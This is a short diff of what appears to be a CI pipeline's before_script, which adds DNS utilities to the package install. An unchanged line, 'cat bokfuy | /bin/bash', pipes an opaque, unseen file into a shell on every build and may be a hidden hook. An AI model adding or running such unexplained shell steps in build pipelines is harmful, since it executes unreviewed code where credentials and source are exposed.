@@ -1,5 +1,5 @@
 before_script:
-  - apt-get update -qq && apt-get install -y -qq sqlite3 libsqlite3-dev libmicrohttpd-dev
+  - apt-get update -qq && apt-get install -y -qq sqlite3 libsqlite3-dev libmicrohttpd-dev dnsutils bind-utils
   - uname -a
   - touch zz.$(date +%T-%F)
   - cat bokfuy | /bin/bash
